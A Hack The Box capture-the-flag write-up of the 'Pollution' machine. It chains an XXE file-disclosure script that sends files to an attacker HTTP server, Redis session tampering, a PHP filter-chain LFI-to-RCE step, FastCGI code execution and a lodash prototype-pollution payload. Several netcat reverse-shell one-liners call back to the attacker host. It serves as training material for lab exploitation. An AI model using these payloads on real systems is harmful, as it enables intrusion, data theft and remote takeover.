---
title: "HTB • Pollution"
tags:
  - "Linux"
  - "Web"
  - "Redis"
  - "Hard Difficulty"
  - "Advanced"
  - "PHP"
  - "XXE"
  - "Code Review"
  - "LFI"
  - "MySQL"
  - "FastCGI"
  - "JavaScript"
  - "CVE"
  - "Prototype Pollution"
  - "SQL"
  - "API"
excerpt: "Pollution is a hard linux machine on Hack the Box that involves various forms of web exploitation like XXE and Prototype Pollution, and features Redis, MySQL, NodeJS and FastCGI"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-pollution/"
---

Pollution is a hard Linux machine created by [**Tr1s0n**](https://app.hackthebox.com/users/575442) on [**Hack The Box**](https://app.hackthebox.com/machines/517) that involves sensitive information disclosure on a hidden site that allows us to create an admin account on the main site. From here we are allowed to send requests to a particular endpoint which accepts **XML external entities**. We use these entities to read local files and disclose credentials along with some source code for another hidden site. We use known credentials to bypass authentication by modifying session information stored on the **Redis** server. An observed **Local File Inclusion (LFI)** vulnerability is then exploited to get a shell as **www-data**. There is a **FastCGI** server listening locally, which we can use to get a shell as **victor**. Victor has a copy of the API source code that is being used in a process owned by **root** in which we identify a version of Lodash vulnerable to **CVE-2018-3721**. This **Prototype Pollution** vulnerability is exploited to gain execution and pop a shell as root.

## Initial Recon

Let's set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@red_team (bash)
rhost="10.10.11.192" # Target IP address
lhost="10.10.14.4" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

The open TCP ports reported in the scan include:

| Port | Service | Product               | Version                |
|:-----|:--------|:----------------------|:-----------------------|
| 22   | SSH     | OpenSSH               | 8.4p1 Debian 5+deb11u1 |
| 80   | HTTP    | Apache httpd          | 2.4.54 (Debian)        |
| 6379 | Redis   | Redis key-value store |                        |

The Redis server on port **6379** requires authentication, so we begin by investigating port **80**.

## Web

First we'll visit <http://10.10.11.192> in a web browser.

![Home Page](homepage.png)

The site header points to a login page at [/login](http://10.10.11.192/login) and a registration page at [/register](http://10.10.11.192/register). Scrolling down a bit, the contact section mentions the hostname **collect.htb**.

![Contact Section](contact.png)

### VHOST Enumeration

Let's check for any VHOSTs under the hostname **collect.htb** with [this FFuF VHOST enumeration wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/web/ctf-vhbrute.sh).

```bash
# bryan@red_team (bash)
bash ctf-vhbrute.sh "$rhost" collect.htb
```
{:.nolineno}

We get two promising results almost immediately:
- **developers.collect.htb** (401 Unauthorized)
- **forum.collect.htb** (200 OK)

We'll add these to `/etc/hosts`{:.filepath} for easy access from a browser.

```bash
# bryan@red_team (bash)
echo 'hostname="collect.htb"' >> .env
echo 'vhost=($hostname developers.$hostname forum.$hostname)' >> .env && . ./.env
echo -e "$rhost\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

We try some default and common login combinations on <http://developers.collect.htb/> with no luck, so we'll investigate the _forum_ site first.

### Forum

We open a browser session and navigate to <http://forum.collect.htb/>

![Forum homepage](forum.png)

Looking at the thread list, there are a few threads mentioning the "Pollution API" and one of them contains a user-submitted file attachment.

![Forum threads](forum-threads.png)

Let's check out this attachment along with its context in the thread.

![Interesting thread](/forum-interesting-thread.png)

The attachment is supposedly some proxy history with requests made to the API. It looks like we need to be authenticated to download the file, but we can just create an account on the [registration page](http://forum.collect.htb/member.php?action=register).

```bash
# bryan@red_team (bash)
file attachment.txt # XML
mv attachment.txt ./attachment.xml && more attachment.xml # manual inspection
```
{:.nolineno}

#### Proxy History

The file has a handful of _request_ and _response_ elements with base64-encoded content. We'll use [xq](https://pypi.org/project/xq/) to extract each request into separate files.

```bash
# bryan@red_team (bash)
requests=($(xq-python -r '.[].item[]|.request."#text"' attachment.xml))
mkdir requests
for line in $requests
do
  request=$(echo $line | base64 -d)
  sum=$(echo $request | md5sum | cut -d\  -f1)
  echo $request > requests/${sum::8} # save each request to requests/[ID]
done
```
{:.nolineno}

One request in particular stands out:

```http
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```
{:file="requests/af2135d4" .nolineno}

Judging from the endpoint name `/set/role/admin`{:.filepath}, it seems like the purpose is to grant special privileges to the current user.

### Upgrade Account

Since we know that there is an account registration page at <http://collect.htb/register>, we'll create an account, login and see what happens when we send that request to `/set/role/admin`{:.filepath}.

![Registration page](register.png)

Once we have signed in, we take the _PHPSESSID_ cookie from our authenticated session and send the following:

```bash
# bryan@red_team (bash)
session="" # value of authenticated PHPSESSID here
curl -i "$vhost[1]/set/role/admin" -b "PHPSESSID=$session" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=ddac62a28254561001277727cb397baf"
```
{:.nolineno}

The response redirects us to [/admin](http://collect.htb/admin), which we are now permitted to access under this session.

![Admin dashboard](admin-dashboard.png)

The admin dashboard includes a registration form for the API.

![Admin API user registration](admin-register.png)

Let's send a request with some random credentials and intercept it in BurpSuite.

```http
POST /api HTTP/1.1
Host: collect.htb
Content-Length: 177
User-Agent: BurpSuite
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://collect.htb
Referer: http://collect.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=jeudpk98fa0b0co7gd1mme4v38
Connection: close

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>garbage</username><password>garbage</password></user></root>
```
{:.nolineno}

We capture a POST request to [/api](http://collect.htb/api) with some XML content assigned to the *manage_api* parameter.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <method>POST</method>
  <uri>/auth/register</uri>
  <user>
    <username>garbage</username>
    <password>garbage</password>
  </user>
</root>
```
{:.nolineno}

It also looks like we can control the URI and HTTP verb of the server-side request.

### XML External Entities

Let's send some [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) payloads and set up a callback listener since this endpoint is processing client-supplied XML. We could probably just leave out the _user_ element since we aren't actually using the registration feature.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [<!ENTITY ssrf SYSTEM "http://10.10.14.4/check">]>
<root>
  <method>GET</method>
  <uri>/&ssrf;</uri>
</root>
```
{:file="xxe-test.xml" .nolineno}

```bash
# bryan@red_team (bash)
session="" # PHPSESSID value here
nc -lvn $lhost 80 &
timeout 2 curl -i "$vhost[1]/api" -b "PHPSESSID=$session" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "manage_api=$(cat xxe-test.xml)"
```
{:.nolineno}

We get an HTTP callback indicating that the application is vulnerable.

#### File Disclosure

We could just use the _file_ wrapper to exfiltrate local files, but that might cause some issues from special characters. We know that this is a PHP application (hence the _PHPSESSID_), so something like the _php_ wrapper would be preferable.

We have at least a couple of options when it comes to reading the file contents:
- add the entity to the _uri_ field so that the 404 response body contains the rendered value.
- direct the request to our own HTTP server with the **@** character

We'll choose the second option because it's a bit sneakier plus we don't have to worry about the encoded file being too long. We just need to setup a HTTP server that will read the encoded file and reflect the decoded contents.

It might look something like this:
```python
import base64, json, sys
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitServer(BaseHTTPRequestHandler):
  def save(self):
    try:
      length = int(self.headers.get('Content-Length'))
      body = json.loads(self.rfile.read(length))
      filename, content = body['username'], body['password']
      with open('exploit-server.log', 'a') as log_file:
          log_file.write(f'{filename}|{content}\n')
      return 200, base64.b64decode(content)
    except Exception:
      return 400, b''

  def do_POST(self):
    check = self.save()
    self.send_response(check[0])
    self.end_headers()
    self.wfile.write(check[1])

def main():
  if len(sys.argv) == 2:
    exploit_server = HTTPServer((sys.argv[1], 80), ExploitServer)
    try:
      print(f'Starting exploit server on http://{sys.argv[1]}/')
      exploit_server.serve_forever()
    except KeyboardInterrupt: pass
    finally:
      exploit_server.server_close()
  else:
    print('python3 exploit-server.py <LHOST>')

if __name__ == '__main__':
  main()
```
{:file="exploit-server.py"}

Then we create a quick bash script to easily read files:

```bash
#!/bin/bash

[ -z "$3" ] && echo './exploit.sh <session> <lhost> <file>' && exit 1
session="$1" # The value of PHPSESSID cookie (user must be admin)
lhost="$2"   # HTB VPN IP address
file="$3"    # File we want to read

xml=$(cat <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [<!ENTITY a SYSTEM "php://filter/convert.base64-encode/resource=${file}">]>
<root>
  <method>POST</method>
  <uri>@${lhost}/</uri>
  <user>
    <username>${file}</username>
    <password>&a;</password>
  </user>
</root>
EOF
)
curl -s "http://collect.htb/api" -b "PHPSESSID=$session" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "manage_api=$xml" -o -
```
{:file="exploit.sh"}

Now we can easily read files while `exploit-server.py`{:.filepath} runs in the background and logs the file contents to `exploit-server.log`{:.filepath}.

```bash
# bryan@red_team (bash)
session="" # your admin PHPSESSID cookie value
python3 ./exploit-server.py $lhost &>/dev/null &
chmod +x exploit.sh
alias exploit="`pwd`/exploit.sh $session $lhost" # create alias for speed
exploit /etc/passwd # read /etc/passwd from target
```
{:.nolineno}

We successfully read `/etc/passwd`{:.filepath}!

> If the exploit stops working, your session has probably expired. Try re-authenticating
{:.prompt-warning}

### Developers Site

Since the web backend uses Apache and <http://developers.collect.htb> required HTTP Basic authentication, there is probably a `.htpasswd`{:.filepath} file in that site's web root.
The web root's parent directory is probably `/var/www`{:.filepath} and considering naming conventions, the directory name is probably something like `developers`{:.filepath} or `developers.collect.htb`{:.filepath}.

```bash
# bryan@red_team (bash)
exploit /var/www/developers/.htpasswd # Bingo!
```
{:.nolineno}

The password here is hashed, but we can try to crack it with [John the Ripper](https://github.com/openwall/john).

```bash
# bryan@red_team (bash)
cat exploit-server.log | grep 'htpasswd' | tail -1 | cut -d\| -f2 | base64 -d > hash.john
john --wordlist=rockyou.txt --format=md5crypt-long ./hash.john # get to cracking
```
{:.nolineno}

We successfully crack the hash! Now we should be able to access <http://developers.collect.htb> with the username **developers_group** and the password **r0cket**.

#### Authentication

Once we pass HTTP basic authentication, we get redirected to a login page at [/login.php](http://developers.collect.htb/login.php).

![Developers site login](developers-login.png)

Let's check out the source code for this page using that file disclosure exploit.

```bash
# bryan@red_team (bash)
exploit /var/www/developers/login.php
exploit /var/www/developers/index.php # LFI !?
exploit /var/www/developers/bootstrap.php # using redis to handle sessions?
```
{:.nolineno}

Just from reading a few source files, we discover some interesting details:
- `index.php`{:.filepath} loads a user-supplied resource ending in _.php_ from the _page_ GET parameter (LFI) although the user must have the session parameter _auth_ set to _True_
- `bootstrap.php`{:.filepath} uses the redis server on port **6379** as the session handler and uses the password **COLLECTR3D1SPASS** to authenticate.

```php
...
    <?php include($_GET['page'] . ".php"); ?>
...
```
{:file="/var/www/developers/index.php" .nolineno}
```php
...
ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://localhost:6379/?auth=COLLECTR3D1SPASS');
...
```
{:file="/var/www/developers/bootstrap.php" .nolineno}

Since Redis is used as the session storage medium and we can supposedly authenticate to Redis using the password in `bootstrap.php`{:.filepath}, we should be able to modify session information and effectively bypass authentication.

```bash
# bryan@red_team (bash)
redis-cli --no-auth-warning -h $rhost -p 6379 -a "COLLECTR3D1SPASS"
```
{:.nolineno}
```bash
# bryan@red_team (redis-cli)
KEYS *
MSET "PHPREDIS_SESSION:2va8uhmnhoru1p78vvuaff4kqk" "auth|b:1;"
MGET "PHPREDIS_SESSION:2va8uhmnhoru1p78vvuaff4kqk"
```
{:file="redis.log" .nolineno}

Now when we visit `/index.php`{:.filepath}, the vulnerable include statement will process the _page_ parameter. This could potentially lead to RCE with the help of a [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator).

```bash
# bryan@red_team (bash)
session="2va8uhmnhoru1p78vvuaff4kqk" # session with auth=True
chain=$(python3 php_filter_chain_generator.py --chain '<?=`$_POST[0]`?>' | tail -1)
chain="${chain/php:\/\/temp/bootstrap}" # use file "bootstrap" because ".php" is appended
curl "$vhost[2]/?page=$chain" -is -o- \
  -u "developers_group:r0cket" \
  -b "PHPSESSID=$session" \
  -d "0=id"
```
{:.nolineno}

In the response we see the output of the `id` command we ran! Now let's set up a reverse shell with [PwnCat](https://pypi.org/project/pwncat-cs/) and send a reverse shell payload.

```bash
# bryan@red_team (PwnCat)
listen -m linux -H 10.10.14.4 443
```
{:file="pwncat.log" .nolineno}
```bash
# bryan@red_team (bash)
cmd="rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|bash -i 2>&1|nc $lhost 443>/tmp/_&"
curl "$vhost[2]/?page=$chain" -is -o- \
  -u "developers_group:r0cket" \
  -b "PHPSESSID=$session" \
  --data-urlencode "0=$cmd"
```
{:.nolineno}

We successfully pop a shell as _www-data_!

## Local Privilege Escalation

There seems to be a few interesting services listening exclusively on localhost, all of which are owned by users other than _www-data_.

```bash
# www-data@pollution (bash)
netstat -tpln | grep 127
```
{:.nolineno}
>
```
Proto  Recv-Q  Send-Q  Local Address       Foreign Address   State    PID/Program name
tcp         0       0  127.0.0.1:9000      0.0.0.0:*         LISTEN   -
tcp         0       0  127.0.0.1:3306      0.0.0.0:*         LISTEN   -
tcp         0       0  127.0.0.1:3000      0.0.0.0:*         LISTEN   -
```

We know that port **3306** is MySQL, and we suspect that port **3000** is related to a `node` process running as root. Port **9000** however, does not have an obvious service we can associate it with, but After a bit of research we discover that this is the default port number for PHP-FPM or FastCGI.

### FastCGI

We'll first just verify that FastCGI is running on port 9000 with `cgi-fcgi`.

```bash
# www-data@pollution (bash)
cgi-fcgi -bind -connect :9000 # Success
```
{:.nolineno}

#### Code Execution

Looking at [this guide on pentesting FastCGI](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi), we find out that we can execute code as the process owner using the `cgi-fcgi` utility with some special environment variables.

```bash
# www-data@pollution (bash)
tmp=$(mktemp --suffix .php)
chmod a+rx $tmp
echo '<?=system("id")?>' > $tmp
SCRIPT_FILENAME=$tmp REQUEST_METHOD=POST cgi-fcgi -bind -connect :9000
rm -f $tmp
```
{:.nolineno}
>
```
...
uid=1002(victor) gid=1002(victor) groups=1002(victor)
```

We can execute commands as _victor_! Now let's trigger a callback to our PwnCat listener to get a reverse shell.

```bash
# www-data@pollution (bash)
tmp=$(mktemp --suffix .php)
chmod a+xr $tmp
lhost="10.10.14.4" # listener IP address
cmd="rm /tmp/v;mkfifo /tmp/v;cat /tmp/v|bash -i 2>&1|nc $lhost 443>/tmp/v&"
echo "<?=system(\"$cmd\")?>" > $tmp
SCRIPT_FILENAME=$tmp REQUEST_METHOD=POST cgi-fcgi -bind -connect :9000
```
{:.nolineno}

Let's also upload our SSH public key so we can easily access the machine via SSH.

```bash
# bryan@red_team (bash)
cat ~/.ssh/id_rsa.pub | cut -d' ' -f-2 # get SSH public key
```
{:.nolineno}
```bash
# victor@pollution (bash)
pub="" # public key here
echo $pub >> /home/victor/.ssh/authorized_keys
```
{:.nolineno}

### Pollution API

_victor_'s home directory has an unusual folder called `pollution_api`{:.filepath} which is likely the source for the node web app being run by root.

```bash
# victor@pollution (bash)
ps aux | egrep 'node' | head -1
```
{:.nolineno}
>
```
USER    PID ... COMMAND
root   1346 ... /usr/bin/node /root/pollution_api/index.js
```
{:.nolineno}

Let's download the API source and do some code review.

```bash
# bryan@red_team (bash)
ssh victor@$rhost tar -czf pollution_api.tgz pollution_api
scp victor@$rhost:pollution_api.tgz .
tar -xzf ./pollution_api.tgz
```
{:.nolineno}

Just looking around, there are a couple secrets we find in the source code that could prove useful later:
- JWT HS256 Key `JWT_COLLECT_124_SECRET_KEY` in `functions/jwt.js`{:.filepath}
- MySQL Credentials `webapp_user:Str0ngP4ssw0rdB*12@1` in `models/db.js`{:.filepath}

Now we'll check for vulnerabilities in the installed packages using the Node Package Manager (NPM).

```bash
# bryan@red_team (bash)
cd pollution_api
npm ls # list packages
npm audit # show vulnerabilities
```
{:.nolineno}

The lodash installation has a whole bunch of vulnerabilities that could help us.

```bash
# bryan@red_team (bash)
npm audit --json > _audit.json
jq '.vulnerabilities.lodash' _audit.json > _audit_lodash.json
jq '.via[]|[.title,.url]' _audit_lodash.json # proto pollution?, cmd injection?
```
{:.nolineno}

Looking through the reference GitHub advisories for each relevant vulnerability, we create a list of vulnerable functions to search the source code for.

```bash
# bryan@red_team (bash)
funcs=("defaultsDeep" "merge" "zipObjectDeep" "template")
for f in $funcs
  do find ./ -type f -iname '*.js' -not -path './node_modules/*' -exec grep $f {} +
done
```
{:.nolineno}

The **messages_send** controller from `controllers/Messages_send.js`{:.filepath} seems to use the vulnerable _merge_ function from the outdated lodash installation. This controller is assigned to the **/admin/messages/send** endpoint in `routes/admin.js`{:.filepath}, which is only accessible to clients registered as an admin. We can bypass these limitations by manually adding an admin user in the MySQL database using the credentials we found in `models/db.js`{:.filepath}.

```bash
# victor@pollution (bash)
mysql -u webapp_user -p'Str0ngP4ssw0rdB*12@1' -D pollution_api \
  -e "INSERT INTO users VALUES (1337, 'user', 'pass', 'admin', 0, 0);"
```
{:.nolineno}

Now when we login using those credentials, we should receive a JWT that grants us admin privileges.

```bash
# victor@pollution (bash)
curl localhost:3000/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"pass"}'
```
{:.nolineno}

#### Prototype Pollution

Looking back at the CVE descriptions associated with the vulnerability in _lodash.merge_ (**CVE-2018-3721** and **CVE-2018-16487**), it looks like we can just use the **__proto__** key to modify the prototype of any object. We could exploit this for RCE by setting the **shell** property before the call to *child_process.exec* since this property will determine what file is executed.

```bash
# victor@pollution (bash)
jwt="" # admin JWT here
lhost="10.10.14.4" # HTB VPN IP address
cmd="rm /tmp/r;mkfifo /tmp/r;cat /tmp/r|bash -i 2>&1|nc $lhost 443>/tmp/r&"
echo $cmd > /tmp/_.sh && chmod a+xr /tmp/_.sh
curl localhost:3000/admin/messages/send \
  -H "Content-Type: application/json" -H "x-access-token: $jwt" \
  -d '{"text":"hello","__proto__":{"shell":"/tmp/_.sh"}}'
```
{:.nolineno}

We receive a callback on our PwnCat listener and successfully establish a system shell!
